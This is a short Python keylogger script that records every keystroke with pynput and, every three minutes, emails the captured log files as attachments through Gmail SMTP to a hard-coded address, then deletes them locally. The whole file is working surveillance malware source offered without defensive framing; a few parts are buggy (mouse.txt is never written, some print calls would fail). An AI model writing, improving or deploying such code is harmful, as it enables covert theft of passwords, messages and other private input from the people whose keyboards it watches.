from pynput.keyboard import Key , Listener 
from threading import Timer 
import smtplib
from email.message import EmailMessage
import os
import datetime


def send_email(body):

            gmail_user = 'adress@gmail.com'
            gmail_password = 'psswd'
            message=EmailMessage()
            message['Subject']='Keyboard record'
            message['From']=gmail_user
            message['To']='address@gmail.com'
            message.set_content(body)
            

            try:
               smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
               smtp_server.login(gmail_user, gmail_password)
               files=["keyboard.txt","mouse.txt"]
               for file in files:
                 f=open(file,'rb') 
                 file_data=f.read()
                 file_name=f.name
                 message.add_attachment(file_data,maintype='application',subtype='txt', filename=file_name)
               smtp_server.send_message(message)
               smtp_server.close()

               x = datetime.datetime.now()

               print (x + "Email sent!")
            except Exception as ex:
               print (x + "Problem in sending email is: ",ex)
 



#keyboard part
def key_pressed(key):
    try:  
          press = str(key.char)  
    except:
          if key == Key.space:
               press = " "
          elif key == Key.enter:
               press = ("\n")
          else:
               press = str(key) + ("\n")   
    f = open("keyboard.txt","a")
    
    f.write(press)
    f.close() 


def timer():
   t=Timer(180,timer)
   t.start()
   try:
      f=open("keyboard.txt","r")
      keyboard=f.read()
      f1=open("mouse.txt","r")
      mouse=f1.read()
      body=" You find the activity records in the attached files"
      send_email(body)
      #print(logs)
      os.remove("keyboard.txt")
      os.remove("mouse.txt")
   except:   
      nothing=""
       
with Listener(on_press=key_pressed) as l:
  timer()
  l.join() 
  
